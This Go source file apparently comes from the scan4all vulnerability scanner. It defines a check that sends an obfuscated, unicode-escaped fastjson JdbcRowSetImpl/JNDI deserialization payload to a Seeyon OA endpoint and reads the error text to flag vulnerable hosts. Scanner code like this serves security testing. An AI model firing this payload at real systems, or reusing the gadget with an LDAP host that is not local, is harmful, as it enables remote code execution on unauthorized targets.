package seeyon

import (
	"github.com/GhostTroops/scan4all/lib/util"
)

func SeeyonFastjson(u string) bool {
	data := `_json_params={"name":{"\u0040\u0074\u0079\u0070\u0065":"\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073","\u0076\u0061\u006c":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"},"x":{"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c","\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065":"ldap://127.0.0.1/v","autoCommit":true}}`
	if req, err := util.HttpRequset(u+"/seeyon/main.do?method=changeLocale", "POST", data, false, nil); err == nil {
		if util.StrContains(req.Body, "com.alibaba.fastjson.JSONException:set") {
			util.SendLog(req.RequestUrl, "seeyon", "Found vuln seeyon SeeyonFastjson", data)
			return true
		}
	}
	return false
}
